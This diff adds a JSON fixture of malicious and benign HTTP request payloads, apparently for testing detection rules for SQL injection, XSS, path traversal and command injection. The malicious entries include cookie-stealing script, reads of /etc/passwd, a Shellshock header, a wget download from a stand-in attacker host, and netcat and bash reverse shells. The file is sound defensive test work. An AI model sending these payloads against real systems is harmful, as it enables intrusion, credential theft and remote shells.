@@ -1,0 +1,130 @@
+{
+  "_comment": "Each payload is the part of a request it is sent in (method, path, query, headers, body), as a client would send it. Fields left out get harmless defaults. Malicious payloads must hit a rule of their attack type; benign ones must hit no rule at all.",
+  "sql_injection": {
+    "malicious": [
+      {"query": "id=1' OR '1'='1"},
+      {"query": "id=1%27%20OR%201%3D1--"},
+      {"query": "user=admin'--"},
+      {"query": "id=-1 UNION SELECT username, password FROM users"},
+      {"query": "id=1/**/UNION/**/ALL/**/SELECT/**/null,version()"},
+      {"query": "cat=2; DROP TABLE users"},
+      {"query": "id=1 AND SLEEP(5)"},
+      {"query": "q=1'; WAITFOR DELAY '0:0:5'--"},
+      {"query": "id=1 AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1"},
+      {"query": "id=1 AND extractvalue(1,concat(0x7e,@@version))"},
+      {"body": "username=admin%27+or+%27a%27%3D%27a&password=x"},
+      {"body": "{\"email\": \"x@y.z' OR 1=1 #\", \"password\": \"a\"}", "headers": {"content-type": "application/json"}},
+      {"headers": {"cookie": "session=abc; uid=1' or 1=1--"}},
+      {"query": "id=1%2527%2520or%25201%253D1"}
+    ],
+    "benign": [
+      {"query": "q=O'Reilly books"},
+      {"query": "q=select a size from the menu"},
+      {"query": "q=rock and roll or jazz"},
+      {"query": "q=union station opening hours"},
+      {"query": "q=how long should I sleep"},
+      {"query": "page=2&sort=price&order=desc"},
+      {"query": "q=Ben & Jerry's"},
+      {"body": "comment=I'd rather update the docs; it's fine&rating=5"},
+      {"body": "{\"title\": \"Drop shipping 101\", \"tags\": [\"or\", \"and\"]}", "headers": {"content-type": "application/json"}},
+      {"query": "email=o'neil@example.com"},
+      {"query": "filter=price>=10 and price<=50"},
+      {"path": "/blog/2024/select-from-the-best"}
+    ]
+  },
+  "xss": {
+    "malicious": [
+      {"query": "q=<script>alert(1)</script>"},
+      {"query": "q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"},
+      {"query": "q=<img src=x onerror=alert(1)>"},
+      {"query": "q=<svg/onload=alert(1)>"},
+      {"query": "next=javascript:alert(1)"},
+      {"query": "q=<iframe src=//evil.example></iframe>"},
+      {"query": "name=\"><body onload=alert('x')>"},
+      {"body": "comment=%3Cdiv+onmouseover%3D%22alert(1)%22%3Ehi%3C%2Fdiv%3E"},
+      {"query": "q=&lt;script&gt;alert(1)&lt;/script&gt;"},
+      {"query": "q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
+      {"query": "url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
+      {"headers": {"referer": "https://example.com/?q=<script>fetch('//x/'+document.cookie)</script>"}},
+      {"query": "q='-prompt`1`-'"}
+    ],
+    "benign": [
+      {"query": "q=javascript: the good parts"},
+      {"query": "q=a < b and c > d"},
+      {"query": "q=<b>bold</b> text"},
+      {"query": "q=online shopping"},
+      {"query": "q=please confirm your order"},
+      {"query": "q=script writing course"},
+      {"body": "bio=I love <3 cats and data science"},
+      {"query": "redirect=/account/settings"},
+      {"body": "{\"html\": \"<p class='intro'>Welcome</p>\"}", "headers": {"content-type": "application/json"}},
+      {"query": "q=alert levels in the city"},
+      {"headers": {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}},
+      {"query": "q=document cookie policy"}
+    ]
+  },
+  "path_traversal": {
+    "malicious": [
+      {"query": "file=../../../etc/passwd"},
+      {"query": "file=..%2f..%2f..%2fetc%2fpasswd"},
+      {"query": "file=..%252f..%252f..%252fetc%252fpasswd"},
+      {"query": "page=....//....//etc/passwd"},
+      {"query": "doc=..\\..\\..\\windows\\win.ini"},
+      {"query": "file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
+      {"path": "/static/%2e%2e/%2e%2e/%2e%2e/etc/shadow"},
+      {"query": "template=/proc/self/environ"},
+      {"query": "img=avatar.php%00.png"},
+      {"query": "page=php://filter/convert.base64-encode/resource=index.php"},
+      {"query": "url=file:///etc/passwd"},
+      {"body": "path=..%2F..%2Fconfig%2Fdatabase.yml"},
+      {"path": "/download", "query": "name=..%5c..%5cboot.ini"}
+    ],
+    "benign": [
+      {"path": "/static/css/main.css"},
+      {"query": "file=report-2024.pdf"},
+      {"query": "q=wait.../what"},
+      {"query": "version=1..2"},
+      {"path": "/docs/getting-started/install"},
+      {"query": "q=how to read a config file"},
+      {"query": "next=/account/orders/42"},
+      {"query": "range=1...10"},
+      {"body": "{\"path\": \"images/2024/holiday.jpg\"}", "headers": {"content-type": "application/json"}},
+      {"query": "q=etc and so on"},
+      {"query": "url=https://example.com/a/b/c"},
+      {"path": "/files/my.passwords.txt"}
+    ]
+  },
+  "command_injection": {
+    "malicious": [
+      {"query": "host=127.0.0.1;cat /etc/passwd"},
+      {"query": "host=127.0.0.1 && whoami"},
+      {"query": "host=127.0.0.1 | id"},
+      {"query": "ip=8.8.8.8%0Auname -a"},
+      {"query": "name=$(whoami)"},
+      {"query": "name=`id`"},
+      {"headers": {"user-agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"}},
+      {"query": "host=x;wget http://evil.example/x.sh"},
+      {"query": "host=x||ping -c 10 127.0.0.1"},
+      {"query": "cmd=x;cat${IFS}/etc/passwd"},
+      {"body": "host=1.1.1.1%3B+nc+-e+%2Fbin%2Fsh+10.0.0.1+4444"},
+      {"query": "file=a.txt & powershell -enc SQBFAFgA"},
+      {"query": "q=x;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"},
+      {"query": "host=127.0.0.1%253Bls%2520-la"}
+    ],
+    "benign": [
+      {"query": "q=salt & pepper"},
+      {"query": "page=1&id=7&cat=books"},
+      {"headers": {"cookie": "session=abc123; id=42; lang=en"}},
+      {"headers": {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"}},
+      {"headers": {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"}},
+      {"query": "q=cats | dogs"},
+      {"query": "q=ping pong tables"},
+      {"body": "note=Buy milk; call mom; echoes of the past"},
+      {"query": "q=Tom & Jerry"},
+      {"query": "q=price: $(10) off"},
+      {"body": "{\"cmd\": \"save\", \"ids\": [1, 2, 3]}", "headers": {"content-type": "application/json"}},
+      {"headers": {"accept-language": "en-US,en;q=0.9"}},
+      {"query": "q=sh*t happens"}
+    ]
+  }
+}
